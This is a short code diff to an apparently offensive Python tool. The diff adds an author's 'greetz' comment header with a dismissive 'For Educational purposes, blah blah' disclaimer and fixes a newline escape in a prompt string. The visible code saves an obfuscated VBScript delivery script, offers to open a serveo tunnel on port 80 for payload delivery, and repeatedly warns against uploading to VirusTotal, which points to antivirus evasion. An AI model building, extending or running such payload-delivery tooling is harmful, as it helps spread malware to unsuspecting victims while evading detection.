@@ -1,4 +1,9 @@
 import random, sys, string, os, time, base64
+
+#Greetz to all GSH members. 
+#Coded by s1ege for your pleasure!
+#For Educational purposes, blah blah...
+
 def clear():
     try: os.system('clear')
     except: _
@@ -113,7 +118,7 @@ def obfs():
 
 
 def serveo():
-    input = raw_input('\n\n\\ntDelivery script obfuscated and saved as "obfs.vbs"\n\n Would you like to start a serveo server to forward port 80 for payload delivery? yes/no: ')
+    input = raw_input('\n\n\n\tDelivery script obfuscated and saved as "obfs.vbs"\n\n Would you like to start a serveo server to forward port 80 for payload delivery? yes/no: ')
     if input == "yes":
         domain = raw_input('enter subdomain name for serveo server: ')
         print("\n\nDon't upload to virus total!!!"* 15)
